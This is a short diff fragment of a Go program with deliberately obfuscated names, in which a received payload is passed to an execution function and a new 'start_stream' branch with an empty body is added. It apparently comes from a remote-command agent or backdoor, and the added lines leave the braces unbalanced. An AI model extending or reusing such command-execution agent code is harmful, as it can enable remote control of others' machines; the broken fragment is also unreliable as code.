@@ -108,6 +108,8 @@ func main() {
 						obf_var_b_int, _ := strconv.Atoi(obf_var_b)
 						obf_var_rate = obf_var_a_int + rand.Intn(obf_var_b_int-obf_var_a_int)
 						obf_var_response = []byte("\x00")
+					if strings.Split(obf_var_payload, " ")[0] == "obf_tag_start_stream" {
+						
 					} else {
 						obf_var_response = obf_func_exec(obf_var_payload)
 					}
